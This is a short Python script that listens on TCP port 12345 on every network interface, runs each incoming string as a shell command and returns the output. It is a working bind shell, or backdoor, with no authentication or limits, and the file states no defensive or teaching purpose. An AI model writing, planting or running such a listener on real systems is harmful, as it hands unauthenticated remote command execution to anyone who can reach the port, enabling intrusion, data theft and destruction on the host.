import socket
import subprocess

HOST = '0.0.0.0'  # Listen on all available network interfaces
PORT = 12345      # Port to listen on

def run_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except subprocess.CalledProcessError as e:
        return str(e.output)

def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()
        print(f"Listening on {HOST}:{PORT}")
        conn, addr = s.accept()
        print(f"Connected by {addr}")

        with conn:
            while True:
                data = conn.recv(1024).decode('utf-8')
                if not data:
                    break

                print(f"Received command: {data}")
                response = run_command(data)
                print(f"Command output:\n{response}")
                conn.sendall(response.encode('utf-8'))

if __name__ == "__main__":
    main()
